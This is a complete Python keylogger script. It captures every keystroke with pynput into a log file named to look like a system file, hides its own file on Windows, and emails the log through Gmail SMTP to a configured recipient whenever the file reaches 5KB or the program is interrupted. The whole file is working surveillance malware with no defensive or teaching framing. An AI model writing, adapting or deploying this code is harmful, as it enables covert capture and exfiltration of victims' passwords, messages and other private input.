import os
import sys
import time
import smtplib
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

# Define email settings and log file path
LOG_FILE = os.path.expanduser("~/.local/system32_keylog.txt")
LOG_SIZE_LIMIT = 5120  # 5KB size limit for the log file
EMAIL_FLAG = 1  # Set this to 1 to send emails, 0 to disable email functionality

# Email configuration
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"
RECIPIENT_EMAIL = "recipient_email@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Function to check network connectivity
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

# Function to send email with log file attachment
def send_email():
    try:
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            return  # Don't send an empty log file

        if EMAIL_FLAG == 1 and is_connected():
            # Email setup
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = RECIPIENT_EMAIL
            msg['Subject'] = "Keylogger Log File"

            # Attach the body of the email
            body = "Attached is the keylogger log file."
            msg.attach(MIMEText(body, 'plain'))

            # Attach the log file
            with open(LOG_FILE, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(LOG_FILE)}")
                msg.attach(part)

            # Establish the connection and send the email
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
            server.quit()

            # Clear the log file after sending
            with open(LOG_FILE, "w") as f:
                f.write("")  # Empty the log file
            print("Email sent successfully with log file.")

        elif EMAIL_FLAG == 0:
            print("Email sending disabled (EMAIL_FLAG = 0).")

    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to log keystrokes
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

    # Check log file size and send email if it exceeds the size limit
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= LOG_SIZE_LIMIT:
        send_email()

# Function to hide the script (Windows only)
def hide_script():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)  # 0x02 makes the file hidden

# Main function to start the keylogger
def start_keylogger():
    hide_script()  # Hide the script after running
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Start the keylogger
if __name__ == "__main__":
    try:
        start_keylogger()
    except KeyboardInterrupt:
        send_email()  # Send the email before exiting
    except Exception as e:
        print(f"Error: {e}")
